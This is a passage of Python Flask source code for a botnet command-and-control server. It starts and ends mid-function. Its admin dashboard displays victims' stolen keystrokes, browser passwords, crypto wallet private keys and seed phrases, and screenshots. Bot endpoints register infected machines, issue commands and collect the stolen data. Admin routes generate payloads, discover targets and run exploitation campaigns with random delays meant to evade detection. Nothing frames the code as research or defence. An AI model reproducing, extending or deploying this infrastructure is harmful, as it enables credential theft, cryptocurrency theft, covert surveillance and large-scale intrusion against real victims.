    for bot in bots:
        data = bot_data.get(bot.id, {})
        capabilities = json.loads(bot.capabilities) if bot.capabilities else {}
        
        html += f"""
        <div class="bot-card">
            <div class="row">
                <div class="col-md-8">
                    <h5><i class="fas fa-desktop me-2"></i>{bot.hostname or bot.id}</h5>
                    <p class="text-muted mb-2">
                        <strong>IP:</strong> {bot.ip_address} | 
                        <strong>OS:</strong> {bot.os_info} | 
                        <strong>User:</strong> {bot.username}
                    </p>
                    <p class="text-muted mb-2">
                        <strong>Registered:</strong> {bot.registered_at.strftime('%Y-%m-%d %H:%M:%S')} | 
                        <strong>Last Seen:</strong> {bot.last_seen.strftime('%Y-%m-%d %H:%M:%S') if bot.last_seen else 'Never'}
                    </p>
                    <div class="mb-2">
                        {_generate_capabilities_badges(capabilities)}
                    </div>
                </div>
                <div class="col-md-4 text-end">
                    <span class="badge bg-{'success' if bot.status == 'active' else 'secondary'}">{bot.status.title()}</span>
                </div>
            </div>
            
            {_generate_bot_data_sections(bot.id, data)}
        </div>
        """
    
    return html

def _generate_capabilities_badges(capabilities):
    """Generate capability badges"""
    badges = []
    for capability, enabled in capabilities.items():
        if enabled:
            badge_class = "bg-success" if capability in ['system_info', 'network_scan', 'process_list'] else "bg-info"
            badges.append(f'<span class="badge {badge_class} me-1">{capability.replace("_", " ").title()}</span>')
    return "".join(badges)

def _generate_bot_data_sections(bot_id, data):
    """Generate data sections for a bot"""
    html = ""
    
    # System Information
    if data.get('system_info'):
        system_data = json.loads(data['system_info'].system_data)
        html += _generate_system_info_section(system_data)
    
    # Network Scan
    if data.get('network_scan'):
        scan_data = json.loads(data['network_scan'].scan_data)
        html += _generate_network_scan_section(scan_data)
    
    # Process List
    if data.get('process_list'):
        process_data = json.loads(data['process_list'].process_data)
        html += _generate_process_list_section(process_data)
    
    # File System
    if data.get('file_system'):
        file_data = json.loads(data['file_system'].file_data)
        html += _generate_file_system_section(file_data)
    
    # Registry Data
    if data.get('registry_data'):
        registry_data = json.loads(data['registry_data'].registry_data)
        html += _generate_registry_section(registry_data)
    
    # Screenshots
    if data.get('screenshots'):
        html += _generate_screenshots_section(data['screenshots'])
    
    # Keylogger Data
    if data.get('keylogger_data'):
        html += _generate_keylogger_section(data['keylogger_data'])
    
    # Chromium Credentials
    if data.get('chromium_credentials'):
        html += _generate_chromium_credentials_section(data['chromium_credentials'])
    
    # Crypto Wallets
    if data.get('crypto_wallets'):
        html += _generate_crypto_wallets_section(data['crypto_wallets'])
    
    return html

def _generate_system_info_section(system_data):
    """Generate system information section"""
    memory_usage = ((system_data.get('memory_total', 0) - system_data.get('memory_available', 0)) / system_data.get('memory_total', 1) * 100) if system_data.get('memory_total') else 0
    
    return f"""
    <div class="data-section">
        <h6><i class="fas fa-info-circle me-2"></i>System Information</h6>
        <div class="row">
            <div class="col-md-6">
                <p><strong>Hostname:</strong> {system_data.get('hostname', 'N/A')}</p>
                <p><strong>OS:</strong> {system_data.get('os', 'N/A')} {system_data.get('os_version', '')}</p>
                <p><strong>Architecture:</strong> {system_data.get('architecture', 'N/A')}</p>
                <p><strong>Processor:</strong> {system_data.get('processor', 'N/A')}</p>
            </div>
            <div class="col-md-6">
                <p><strong>Memory Usage:</strong> {memory_usage:.1f}%</p>
                <div class="progress-custom">
                    <div class="progress-bar bg-{'success' if memory_usage < 70 else 'warning' if memory_usage < 90 else 'danger'}" 
                         style="width: {memory_usage}%"></div>
                </div>
                <p><strong>Total Memory:</strong> {(system_data.get('memory_total', 0) / 1024 / 1024 / 1024):.2f} GB</p>
                <p><strong>Available Memory:</strong> {(system_data.get('memory_available', 0) / 1024 / 1024 / 1024):.2f} GB</p>
            </div>
        </div>
    </div>
    """

def _generate_network_scan_section(scan_data):
    """Generate network scan section"""
    if not scan_data.get('ports'):
        return ""
    
    ports_html = ""
    for port in scan_data['ports']:
        service = port.get('service', 'Unknown')
        state = port.get('state', 'unknown')
        ports_html += f"""
        <tr>
            <td>{port.get('port')}</td>
            <td>{service}</td>
            <td><span class="badge bg-{'success' if state == 'open' else 'secondary'}">{state}</span></td>
        </tr>
        """
    
    return f"""
    <div class="data-section">
        <h6><i class="fas fa-network-wired me-2"></i>Network Scan</h6>
        <div class="table-responsive">
            <table class="table table-sm">
                <thead>
                    <tr>
                        <th>Port</th>
                        <th>Service</th>
                        <th>Status</th>
                    </tr>
                </thead>
                <tbody>
                    {ports_html}
                </tbody>
            </table>
        </div>
        <p><strong>Network Interfaces:</strong></p>
        <ul class="list-unstyled">
            {"".join([f'<li><i class="fas fa-ethernet me-2"></i>{iface.get("name", "N/A")}: {iface.get("ip", "N/A")}</li>' for iface in scan_data.get('interfaces', [])])}
        </ul>
    </div>
    """

def _generate_process_list_section(process_data):
    """Generate process list section"""
    if not process_data.get('processes'):
        return ""
    
    processes_html = ""
    for proc in process_data['processes'][:10]:  # Limit to first 10 processes
        processes_html += f"""
        <tr>
            <td>{proc.get('pid', 'N/A')}</td>
            <td>{proc.get('name', 'N/A')}</td>
            <td>{proc.get('cpu_percent', '0.0'):.1f}%</td>
            <td>{(proc.get('memory_info', {}).get('rss', 0) / 1024 / 1024):.2f} MB</td>
        </tr>
        """
    
    return f"""
    <div class="data-section">
        <h6><i class="fas fa-cogs me-2"></i>Process List</h6>
        <div class="table-responsive">
            <table class="table table-sm">
                <thead>
                    <tr>
                        <th>PID</th>
                        <th>Name</th>
                        <th>CPU %</th>
                        <th>Memory</th>
                    </tr>
                </thead>
                <tbody>
                    {processes_html}
                </tbody>
            </table>
        </div>
        <p><strong>Total Processes:</strong> {len(process_data.get('processes', []))}</p>
    </div>
    """

def _generate_file_system_section(file_data):
    """Generate file system section"""
    if not file_data.get('directories') and not file_data.get('files'):
        return ""
    
    directories_html = ""
    for dir in file_data.get('directories', [])[:5]:
        directories_html += f'<li><i class="fas fa-folder me-2"></i>{dir}</li>'
    
    files_html = ""
    for file in file_data.get('files', [])[:5]:
        files_html += f'<li><i class="fas fa-file me-2"></i>{file.get("name", "N/A")} ({(file.get("size", 0) / 1024 / 1024):.2f} MB)</li>'
    
    return f"""
    <div class="data-section">
        <h6><i class="fas fa-hdd me-2"></i>File System</h6>
        <div class="row">
            <div class="col-md-6">
                <p><strong>Directories:</strong></p>
                <ul class="list-unstyled">
                    {directories_html}
                </ul>
            </div>
            <div class="col-md-6">
                <p><strong>Files:</strong></p>
                <ul class="list-unstyled">
                    {files_html}
                </ul>
            </div>
        </div>
    </div>
    """

def _generate_registry_section(registry_data):
    """Generate registry section"""
    if not registry_data.get('keys'):
        return ""
    
    keys_html = ""
    for key in registry_data['keys'][:5]:
        keys_html += f'<li><i class="fas fa-key me-2"></i>{key.get("path", "N/A")}</li>'
    
    return f"""
    <div class="data-section">
        <h6><i class="fas fa-database me-2"></i>Registry Data</h6>
        <p><strong>Registry Keys:</strong></p>
        <ul class="list-unstyled">
            {keys_html}
        </ul>
        <p><strong>Total Keys:</strong> {len(registry_data.get('keys', []))}</p>
    </div>
    """

def _generate_screenshots_section(screenshots):
    """Generate screenshots section"""
    if not screenshots:
        return ""
    
    screenshots_html = ""
    for screenshot in screenshots:
        screenshots_html += f"""
        <div class="col-md-3 mb-3">
            <img src="data:image/png;base64,{screenshot.screenshot_data}" 
                 class="screenshot-img" 
                 onclick="openImage(this.src)"
                 alt="Screenshot">
            <p class="text-muted small text-center">
                {screenshot.timestamp.strftime('%Y-%m-%d %H:%M:%S')}
            </p>
        </div>
        """
    
    return f"""
    <div class="data-section">
        <h6><i class="fas fa-image me-2"></i>Screenshots</h6>
        <div class="row">
            {screenshots_html}
        </div>
    </div>
    """

def _generate_keylogger_section(keylogger_data):
    """Generate keylogger section"""
    if not keylogger_data:
        return ""
    
    keystrokes = ""
    for entry in keylogger_data:
        data = json.loads(entry.keystroke_data)
        keystrokes += f'<div class="keystroke-data">{data.get("keystrokes", "")}</div>'
    
    return f"""
    <div class="data-section">
        <h6><i class="fas fa-keyboard me-2"></i>Keylogger Data</h6>
        {keystrokes}
    </div>
    """

def _generate_chromium_credentials_section(chromium_credentials):
    """Generate Chromium credentials section"""
    if not chromium_credentials:
        return ""
    
    credentials_html = ""
    for cred in chromium_credentials:
        credentials_html += f"""
        <div class="credential-entry">
            <p class="mb-1"><strong>URL:</strong> {cred.url}</p>
            <p class="mb-1"><strong>Username:</strong> {cred.username}</p>
            <p class="mb-1"><strong>Password:</strong> {cred.password}</p>
            <p class="mb-0 text-muted"><small>{cred.timestamp.strftime('%Y-%m-%d %H:%M:%S')}</small></p>
        </div>
        """
    
    return f"""
    <div class="data-section">
        <h6><i class="fab fa-chrome me-2"></i>Chromium Credentials</h6>
        {credentials_html}
    </div>
    """

def _generate_crypto_wallets_section(crypto_wallets):
    """Generate cryptocurrency wallets section"""
    if not crypto_wallets:
        return ""
    
    wallets_html = ""
    for wallet in crypto_wallets:
        wallets_html += f"""
        <div class="wallet-entry">
            <p class="mb-1"><strong>Wallet:</strong> {wallet.wallet_name}</p>
            <p class="mb-1"><strong>Path:</strong> {wallet.wallet_path}</p>
            <p class="mb-1"><strong>Private Key:</strong> {wallet.private_key[:20]}...{wallet.private_key[-10:] if wallet.private_key else ''}</p>
            <p class="mb-1"><strong>Mnemonic:</strong> {wallet.mnemonic_phrase[:20]}...{wallet.mnemonic_phrase[-10:] if wallet.mnemonic_phrase else ''}</p>
            <p class="mb-0 text-muted"><small>{wallet.timestamp.strftime('%Y-%m-%d %H:%M:%S')}</small></p>
        </div>
        """
    
    return f"""
    <div class="data-section">
        <h6><i class="fas fa-wallet me-2"></i>Cryptocurrency Wallets</h6>
        {wallets_html}
    </div>
    """

def _generate_c2_operations_section(targets, campaigns, payloads, recent_tasks):
    """Generate C2 operations section"""
    # Targets table
    targets_html = ""
    for target in targets:
        targets_html += f"""
        <tr>
            <td>{target.ip_address}</td>
            <td>{target.hostname}</td>
            <td>{target.os_info}</td>
            <td><span class="badge bg-{'success' if target.status == 'exploited' else 'warning' if target.status == 'discovered' else 'danger'}">{target.status.title()}</span></td>
        </tr>
        """
    
    # Campaigns table
    campaigns_html = ""
    for campaign in campaigns:
        campaigns_html += f"""
        <tr>
            <td>{campaign.name}</td>
            <td>{campaign.status.title()}</td>
            <td>{campaign.targets_exploited}/{campaign.targets_discovered}</td>
            <td>{campaign.success_rate:.1f}%</td>
        </tr>
        """
    
    # Payloads table
    payloads_html = ""
    for payload in payloads:
        payloads_html += f"""
        <tr>
            <td>{payload.name}</td>
            <td>{payload.platform}/{payload.architecture}</td>
            <td>{payload.payload_type.upper()}</td>
            <td>{payload.created_at.strftime('%Y-%m-%d %H:%M:%S')}</td>
        </tr>
        """
    
    # Tasks table
    tasks_html = ""
    for task in recent_tasks:
        tasks_html += f"""
        <tr>
            <td>{task.task_type.title()}</td>
            <td>{task.status.title()}</td>
            <td>{task.created_at.strftime('%Y-%m-%d %H:%M:%S')}</td>
            <td>{task.execution_time:.2f}s</td>
        </tr>
        """
    
    return f"""
    <div class="row">
        <div class="col-md-6">
            <div class="feature-section">
                <div class="feature-icon">
                    <i class="fas fa-crosshairs"></i>
                </div>
                <h5>Discovered Targets</h5>
                <div class="table-responsive">
                    <table class="table table-sm">
                        <thead>
                            <tr>
                                <th>IP Address</th>
                                <th>Hostname</th>
                                <th>OS</th>
                                <th>Status</th>
                            </tr>
                        </thead>
                        <tbody>
                            {targets_html}
                        </tbody>
                    </table>
                </div>
            </div>
        </div>
        <div class="col-md-6">
            <div class="feature-section">
                <div class="feature-icon">
                    <i class="fas fa-rocket"></i>
                </div>
                <h5>Active Campaigns</h5>
                <div class="table-responsive">
                    <table class="table table-sm">
                        <thead>
                            <tr>
                                <th>Name</th>
                                <th>Status</th>
                                <th>Success Rate</th>
                                <th>Exploited</th>
                            </tr>
                        </thead>
                        <tbody>
                            {campaigns_html}
                        </tbody>
                    </table>
                </div>
            </div>
        </div>
    </div>
    <div class="row mt-4">
        <div class="col-md-6">
            <div class="feature-section">
                <div class="feature-icon">
                    <i class="fas fa-bomb"></i>
                </div>
                <h5>Generated Payloads</h5>
                <div class="table-responsive">
                    <table class="table table-sm">
                        <thead>
                            <tr>
                                <th>Name</th>
                                <th>Platform</th>
                                <th>Type</th>
                                <th>Created</th>
                            </tr>
                        </thead>
                        <tbody>
                            {payloads_html}
                        </tbody>
                    </table>
                </div>
            </div>
        </div>
        <div class="col-md-6">
            <div class="feature-section">
                <div class="feature-icon">
                    <i class="fas fa-tasks"></i>
                </div>
                <h5>Recent Tasks</h5>
                <div class="table-responsive">
                    <table class="table table-sm">
                        <thead>
                            <tr>
                                <th>Type</th>
                                <th>Status</th>
                                <th>Time</th>
                                <th>Duration</th>
                            </tr>
                        </thead>
                        <tbody>
                            {tasks_html}
                        </tbody>
                    </table>
                </div>
            </div>
        </div>
    </div>
    """

def _generate_duckdns_section(duckdns_config):
    """Generate DuckDNS configuration section"""
    if not duckdns_config:
        return """
        <div class="alert alert-warning">
            <i class="fas fa-exclamation-triangle me-2"></i>
            DuckDNS configuration not set up. Configure DuckDNS to enable dynamic DNS updates.
        </div>
        """
    
    status = "Active" if duckdns_config.is_active else "Inactive"
    status_class = "success" if duckdns_config.is_active else "secondary"
    last_update = duckdns_config.last_update.strftime('%Y-%m-%d %H:%M:%S') if duckdns_config.last_update else "Never"
    
    return f"""
    <div class="feature-section">
        <div class="d-flex justify-content-between align-items-center mb-3">
            <h5><i class="fas fa-globe me-2"></i>DuckDNS Configuration</h5>
            <span class="badge bg-{status_class}">{status}</span>
        </div>
        
        <div class="row mb-3">
            <div class="col-md-6">
                <div class="card">
                    <div class="card-body">
                        <h6 class="card-title">Configuration</h6>
                        <p><strong>Domain:</strong> {duckdns_config.domain}.duckdns.org</p>
                        <p><strong>Token:</strong> {duckdns_config.token[:10]}...{duckdns_config.token[-10:]}</p>
                        <p><strong>Last Update:</strong> {last_update}</p>
                    </div>
                </div>
            </div>
            <div class="col-md-6">
                <div class="card">
                    <div class="card-body">
                        <h6 class="card-title">Actions</h6>
                        <form method="POST" action="/admin/duckdns/update">
                            <button type="submit" class="btn btn-primary w-100 mb-2">
                                <i class="fas fa-sync me-2"></i>Update Now
                            </button>
                        </form>
                        <form method="POST" action="/admin/duckdns/toggle">
                            <input type="hidden" name="is_active" value="{'0' if duckdns_config.is_active else '1'}">
                            <button type="submit" class="btn btn-{'secondary' if duckdns_config.is_active else 'success'} w-100">
                                <i class="fas fa-power-off me-2"></i>{'Disable' if duckdns_config.is_active else 'Enable'} DuckDNS
                            </button>
                        </form>
                    </div>
                </div>
            </div>
        </div>
        
        <div class="alert alert-info">
            <i class="fas fa-info-circle me-2"></i>
            DuckDNS allows your C2 server to be reachable via a consistent domain name even if your IP address changes.
        </div>
    </div>
    """

def _generate_recent_commands_section(recent_commands):
    """Generate recent commands section"""
    if not recent_commands:
        return ""
    
    commands_html = ""
    for cmd in recent_commands:
        commands_html += f"""
        <tr>
            <td>{cmd.bot_id[:8]}...</td>
            <td>{cmd.command}</td>
            <td>{json.loads(cmd.args) if cmd.args else ''}</td>
            <td><span class="badge bg-{'success' if cmd.status == 'completed' else 'warning' if cmd.status == 'pending' else 'danger'}">{cmd.status.title()}</span></td>
            <td>{cmd.timestamp.strftime('%Y-%m-%d %H:%M:%S')}</td>
        </tr>
        """
    
    return f"""
    <div class="mb-5">
        <h3 class="mb-4"><i class="fas fa-terminal me-2"></i>Recent Commands</h3>
        <div class="feature-section">
            <div class="table-responsive">
                <table class="table">
                    <thead>
                        <tr>
                            <th>Bot</th>
                            <th>Command</th>
                            <th>Arguments</th>
                            <th>Status</th>
                            <th>Time</th>
                        </tr>
                    </thead>
                    <tbody>
                        {commands_html}
                    </tbody>
                </table>
            </div>
        </div>
    </div>
    """

# Additional routes
@app.route('/admin/duckdns/update', methods=['POST'])
def update_duckdns():
    if 'admin_logged_in' not in session:
        return redirect(url_for('admin_login'))
    
    success = server.update_duckdns()
    flash('DuckDNS updated successfully!' if success else 'Failed to update DuckDNS.', 'success' if success else 'error')
    return redirect(url_for('admin_dashboard'))

@app.route('/admin/duckdns/toggle', methods=['POST'])
def toggle_duckdns():
    if 'admin_logged_in' not in session:
        return redirect(url_for('admin_login'))
    
    duckdns = DuckDNSUpdater.query.first()
    if duckdns:
        duckdns.is_active = bool(int(request.form.get('is_active', '0')))
        db.session.commit()
        flash(f"DuckDNS {'enabled' if duckdns.is_active else 'disabled'} successfully.", 'success')
    
    return redirect(url_for('admin_dashboard'))

@app.route('/admin/logout')
def admin_logout():
    session.pop('admin_logged_in', None)
    session.pop('admin_id', None)
    flash('You have been logged out.', 'info')
    return redirect(url_for('admin_login'))

# Bot communication endpoints
@app.route('/bot/register', methods=['POST'])
def bot_register():
    data = request.json
    if not data:
        return jsonify({'error': 'Invalid data'}), 400
    
    # Generate bot ID
    bot_id = secrets.token_urlsafe(16)
    
    # Create new bot
    bot = Bot(
        id=bot_id,
        ip_address=request.remote_addr,
        hostname=data.get('hostname', 'unknown'),
        os_info=data.get('os_info', 'unknown'),
        username=data.get('username', 'unknown'),
        capabilities=json.dumps(data.get('capabilities', {})),
        session_token=secrets.token_urlsafe(32)
    )
    
    db.session.add(bot)
    db.session.commit()
    
    # Store system info
    system_info = SystemInfo(
        bot_id=bot_id,
        system_data=json.dumps(data.get('system_info', {}))
    )
    db.session.add(system_info)
    db.session.commit()
    
    return jsonify({
        'bot_id': bot_id,
        'session_token': bot.session_token,
        'server_time': datetime.utcnow().isoformat()
    })

@app.route('/bot/command/<bot_id>', methods=['GET'])
def get_command(bot_id):
    session_token = request.headers.get('X-Session-Token')
    if not session_token:
        return jsonify({'error': 'Missing session token'}), 401
    
    # Verify session token
    bot = Bot.query.filter_by(id=bot_id, session_token=session_token).first()
    if not bot:
        return jsonify({'error': 'Invalid session token'}), 401
    
    # Update last seen
    bot.last_seen = datetime.utcnow()
    db.session.commit()
    
    # Get pending command
    command = Command.query.filter_by(bot_id=bot_id, status='pending').first()
    if command:
        command.status = 'running'
        db.session.commit()
        
        return jsonify({
            'id': command.id,
            'command': command.command,
            'args': json.loads(command.args) if command.args else {}
        })
    
    return jsonify({'status': 'no_command'})

@app.route('/bot/result/', methods=['POST'])
def submit_result(command_id):
    session_token = request.headers.get('X-Session-Token')
    if not session_token:
        return jsonify({'error': 'Missing session token'}), 401
    
    data = request.json
    if not data:
        return jsonify({'error': 'Invalid data'}), 400
    
    # Find command
    command = Command.query.get(command_id)
    if not command:
        return jsonify({'error': 'Command not found'}), 404
    
    # Verify session token
    bot = Bot.query.filter_by(id=command.bot_id, session_token=session_token).first()
    if not bot:
        return jsonify({'error': 'Invalid session token'}), 401
    
    # Update command
    command.status = 'completed'
    command.result = json.dumps(data.get('result', {}))
    db.session.commit()
    
    return jsonify({'status': 'success'})

@app.route('/bot/data/system_info', methods=['POST'])
def submit_system_info():
    session_token = request.headers.get('X-Session-Token')
    if not session_token:
        return jsonify({'error': 'Missing session token'}), 401
    
    data = request.json
    if not data or 'bot_id' not in data or 'system_info' not in data:
        return jsonify({'error': 'Invalid data'}), 400
    
    # Verify session token
    bot = Bot.query.filter_by(id=data['bot_id'], session_token=session_token).first()
    if not bot:
        return jsonify({'error': 'Invalid session token'}), 401
    
    # Store system info
    system_info = SystemInfo(
        bot_id=data['bot_id'],
        system_data=json.dumps(data['system_info'])
    )
    db.session.add(system_info)
    db.session.commit()
    
    return jsonify({'status': 'success'})

@app.route('/bot/data/network_scan', methods=['POST'])
def submit_network_scan():
    session_token = request.headers.get('X-Session-Token')
    if not session_token:
        return jsonify({'error': 'Missing session token'}), 401
    
    data = request.json
    if not data or 'bot_id' not in data or 'scan_data' not in data:
        return jsonify({'error': 'Invalid data'}), 400
    
    # Verify session token
    bot = Bot.query.filter_by(id=data['bot_id'], session_token=session_token).first()
    if not bot:
        return jsonify({'error': 'Invalid session token'}), 401
    
    # Store network scan
    network_scan = NetworkScan(
        bot_id=data['bot_id'],
        scan_data=json.dumps(data['scan_data'])
    )
    db.session.add(network_scan)
    db.session.commit()
    
    return jsonify({'status': 'success'})

@app.route('/bot/data/process_list', methods=['POST'])
def submit_process_list():
    session_token = request.headers.get('X-Session-Token')
    if not session_token:
        return jsonify({'error': 'Missing session token'}), 401
    
    data = request.json
    if not data or 'bot_id' not in data or 'process_data' not in data:
        return jsonify({'error': 'Invalid data'}), 400
    
    # Verify session token
    bot = Bot.query.filter_by(id=data['bot_id'], session_token=session_token).first()
    if not bot:
        return jsonify({'error': 'Invalid session token'}), 401
    
    # Store process list
    process_list = ProcessList(
        bot_id=data['bot_id'],
        process_data=json.dumps(data['process_data'])
    )
    db.session.add(process_list)
    db.session.commit()
    
    return jsonify({'status': 'success'})

@app.route('/bot/data/file_system', methods=['POST'])
def submit_file_system():
    session_token = request.headers.get('X-Session-Token')
    if not session_token:
        return jsonify({'error': 'Missing session token'}), 401
    
    data = request.json
    if not data or 'bot_id' not in data or 'file_data' not in data:
        return jsonify({'error': 'Invalid data'}), 400
    
    # Verify session token
    bot = Bot.query.filter_by(id=data['bot_id'], session_token=session_token).first()
    if not bot:
        return jsonify({'error': 'Invalid session token'}), 401
    
    # Store file system data
    file_system = FileSystem(
        bot_id=data['bot_id'],
        path=data.get('path', ''),
        file_data=json.dumps(data['file_data'])
    )
    db.session.add(file_system)
    db.session.commit()
    
    return jsonify({'status': 'success'})

@app.route('/bot/data/registry', methods=['POST'])
def submit_registry():
    session_token = request.headers.get('X-Session-Token')
    if not session_token:
        return jsonify({'error': 'Missing session token'}), 401
    
    data = request.json
    if not data or 'bot_id' not in data or 'registry_data' not in data:
        return jsonify({'error': 'Invalid data'}), 400
    
    # Verify session token
    bot = Bot.query.filter_by(id=data['bot_id'], session_token=session_token).first()
    if not bot:
        return jsonify({'error': 'Invalid session token'}), 401
    
    # Store registry data
    registry_data = RegistryData(
        bot_id=data['bot_id'],
        registry_data=json.dumps(data['registry_data'])
    )
    db.session.add(registry_data)
    db.session.commit()
    
    return jsonify({'status': 'success'})

@app.route('/bot/data/screenshot', methods=['POST'])
def submit_screenshot():
    session_token = request.headers.get('X-Session-Token')
    if not session_token:
        return jsonify({'error': 'Missing session token'}), 401
    
    data = request.json
    if not data or 'bot_id' not in data or 'screenshot_data' not in data:
        return jsonify({'error': 'Invalid data'}), 400
    
    # Verify session token
    bot = Bot.query.filter_by(id=data['bot_id'], session_token=session_token).first()
    if not bot:
        return jsonify({'error': 'Invalid session token'}), 401
    
    # Store screenshot
    screenshot = Screenshot(
        bot_id=data['bot_id'],
        screenshot_data=data['screenshot_data']
    )
    db.session.add(screenshot)
    db.session.commit()
    
    return jsonify({'status': 'success'})

@app.route('/bot/data/keylogger', methods=['POST'])
def submit_keylogger():
    session_token = request.headers.get('X-Session-Token')
    if not session_token:
        return jsonify({'error': 'Missing session token'}), 401
    
    data = request.json
    if not data or 'bot_id' not in data or 'keystroke_data' not in data:
        return jsonify({'error': 'Invalid data'}), 400
    
    # Verify session token
    bot = Bot.query.filter_by(id=data['bot_id'], session_token=session_token).first()
    if not bot:
        return jsonify({'error': 'Invalid session token'}), 401
    
    # Store keylogger data
    keylogger_data = KeyloggerData(
        bot_id=data['bot_id'],
        keystroke_data=json.dumps(data['keystroke_data'])
    )
    db.session.add(keylogger_data)
    db.session.commit()
    
    return jsonify({'status': 'success'})

@app.route('/bot/data/chromium', methods=['POST'])
def submit_chromium_credentials():
    session_token = request.headers.get('X-Session-Token')
    if not session_token:
        return jsonify({'error': 'Missing session token'}), 401
    
    data = request.json
    if not data or 'bot_id' not in data or 'credentials' not in data:
        return jsonify({'error': 'Invalid data'}), 400
    
    # Verify session token
    bot = Bot.query.filter_by(id=data['bot_id'], session_token=session_token).first()
    if not bot:
        return jsonify({'error': 'Invalid session token'}), 401
    
    # Store Chromium credentials
    for cred in data['credentials']:
        chromium_cred = ChromiumCredentials(
            bot_id=data['bot_id'],
            url=cred.get('url', ''),
            username=cred.get('username', ''),
            password=cred.get('password', ''),
            browser=cred.get('browser', 'unknown')
        )
        db.session.add(chromium_cred)
    
    db.session.commit()
    return jsonify({'status': 'success'})

@app.route('/bot/data/crypto_wallets', methods=['POST'])
def submit_crypto_wallets():
    session_token = request.headers.get('X-Session-Token')
    if not session_token:
        return jsonify({'error': 'Missing session token'}), 401
    
    data = request.json
    if not data or 'bot_id' not in data or 'wallets' not in data:
        return jsonify({'error': 'Invalid data'}), 400
    
    # Verify session token
    bot = Bot.query.filter_by(id=data['bot_id'], session_token=session_token).first()
    if not bot:
        return jsonify({'error': 'Invalid session token'}), 401
    
    # Store cryptocurrency wallets
    for wallet in data['wallets']:
        crypto_wallet = CryptoWallet(
            bot_id=data['bot_id'],
            wallet_name=wallet.get('name', 'unknown'),
            wallet_path=wallet.get('path', ''),
            wallet_data=json.dumps(wallet.get('data', {})),
            private_key=wallet.get('private_key', ''),
            mnemonic_phrase=wallet.get('mnemonic_phrase', '')
        )
        db.session.add(crypto_wallet)
    
    db.session.commit()
    return jsonify({'status': 'success'})

@app.route('/admin/commands', methods=['POST'])
def send_command():
    if 'admin_logged_in' not in session:
        return jsonify({'error': 'Unauthorized'}), 401
    
    data = request.json
    if not data or 'bot_id' not in data or 'command' not in data:
        return jsonify({'error': 'Invalid data'}), 400
    
    # Generate command ID
    command_id = secrets.token_urlsafe(16)
    
    # Create command
    command = Command(
        id=command_id,
        bot_id=data['bot_id'],
        command=data['command'],
        args=json.dumps(data.get('args', {}))
    )
    
    db.session.add(command)
    db.session.commit()
    
    return jsonify({
        'command_id': command_id,
        'status': 'pending'
    })

@app.route('/admin/payloads', methods=['POST'])
def create_payload():
    if 'admin_logged_in' not in session:
        return jsonify({'error': 'Unauthorized'}), 401
    
    data = request.json
    if not data or 'name' not in data or 'platform' not in data or 'architecture' not in data:
        return jsonify({'error': 'Invalid data'}), 400
    
    # Generate payload
    payload_data = server.payload_generator.generate_payload(
        data['platform'],
        data['architecture'],
        data.get('payload_type', 'exe')
    )
    
    if not payload_data:
        return jsonify({'error': 'Failed to generate payload'}), 500
    
    # Create payload record
    payload = Payload(
        name=data['name'],
        payload_type=payload_data['type'],
        platform=payload_data['platform'],
        architecture=payload_data['architecture'],
        payload_data=payload_data['data'],
        encryption_key=secrets.token_urlsafe(32)
    )
    
    db.session.add(payload)
    db.session.commit()
    
    return jsonify({
        'payload_id': payload.id,
        'download_url': f"/admin/payloads/{payload.id}/download"
    })

@app.route('/admin/payloads//download')
def download_payload(payload_id):
    if 'admin_logged_in' not in session:
        return redirect(url_for('admin_login'))
    
    payload = Payload.query.get(payload_id)
    if not payload:
        return "Payload not found", 404
    
    # Create temporary file
    temp_dir = tempfile.gettempdir()
    filename = f"{payload.name}.{payload.payload_type}"
    filepath = os.path.join(temp_dir, filename)
    
    # Write payload data to file
    with open(filepath, 'wb') as f:
        f.write(payload.payload_data)
    
    # Send file to user
    return send_file(
        filepath,
        as_attachment=True,
        download_name=filename,
        mimetype='application/octet-stream'
    )

@app.route('/admin/targets/discover', methods=['POST'])
def discover_targets():
    if 'admin_logged_in' not in session:
        return jsonify({'error': 'Unauthorized'}), 401
    
    data = request.json
    if not data:
        return jsonify({'error': 'Invalid data'}), 400
    
    # Discover targets
    targets = server.target_discovery.discover_targets(data)
    
    # Save targets to database
    for target in targets:
        existing = Target.query.filter_by(ip_address=target['ip']).first()
        if not existing:
            new_target = Target(
                ip_address=target['ip'],
                hostname=target.get('hostname', ''),
                os_info=target.get('os_info', 'Unknown'),
                open_ports=json.dumps(target.get('open_ports', [])),
                vulnerabilities=json.dumps(target.get('vulnerabilities', [])),
                services=json.dumps(target.get('services', []))
            )
            db.session.add(new_target)
    
    db.session.commit()
    
    return jsonify({
        'targets_found': len(targets),
        'targets': targets
    })

@app.route('/admin/campaigns', methods=['POST'])
def create_campaign():
    if 'admin_logged_in' not in session:
        return jsonify({'error': 'Unauthorized'}), 401
    
    data = request.json
    if not data or 'name' not in data or 'payload_id' not in data or 'target_criteria' not in data:
        return jsonify({'error': 'Invalid data'}), 400
    
    # Create campaign
    campaign = Campaign(
        name=data['name'],
        description=data.get('description', ''),
        payload_id=data['payload_id'],
        target_criteria=json.dumps(data['target_criteria'])
    )
    
    db.session.add(campaign)
    db.session.commit()
    
    # Start campaign execution
    server.active_campaigns[campaign.id] = {
        'campaign': campaign,
        'status': 'running',
        'targets_processed': 0,
        'targets_exploited': 0
    }
    
    # Start campaign thread
    threading.Thread(target=execute_campaign, args=(campaign.id,)).start()
    
    return jsonify({
        'campaign_id': campaign.id,
        'status': 'running'
    })

def execute_campaign(campaign_id):
    """Execute a campaign against targets"""
    campaign = Campaign.query.get(campaign_id)
    if not campaign:
        return
    
    try:
        # Parse target criteria
        criteria = json.loads(campaign.target_criteria)
        
        # Discover targets
        targets = server.target_discovery.discover_targets(criteria)
        
        # Update campaign stats
        campaign.targets_discovered = len(targets)
        db.session.commit()
        
        # Process each target
        for target in targets:
            # Check target reputation
            reputation = server.threat_intelligence.check_target_reputation(target['ip'])
            
            # Skip if target reputation is too low
            if reputation < 0.3:
                continue
            
            # Attempt exploitation
            success = attempt_exploitation(target, campaign.payload_id)
            
            # Update campaign stats
            campaign.targets_processed += 1
            if success:
                campaign.targets_exploited += 1
            
            campaign.success_rate = (campaign.targets_exploited / campaign.targets_processed) * 100
            db.session.commit()
            
            # Sleep between targets to avoid detection
            time.sleep(random.uniform(1, 5))
        
        # Mark campaign as completed
        campaign.status = 'completed'
        db.session.commit()
        
    except Exception as e:
        logging.error(f"Campaign execution failed: {e}")
        campaign.status = 'failed'
        db.session.commit()

def attempt_exploitation(target, payload_id):
    """Attempt to exploit a target using the specified payload"""
    try:
        # Get payload
        payload = Payload.query.get(payload_id)
        if not payload:
            return False
        
        # Determine exploitation method based on target OS
        exploit_method = 'unknown'
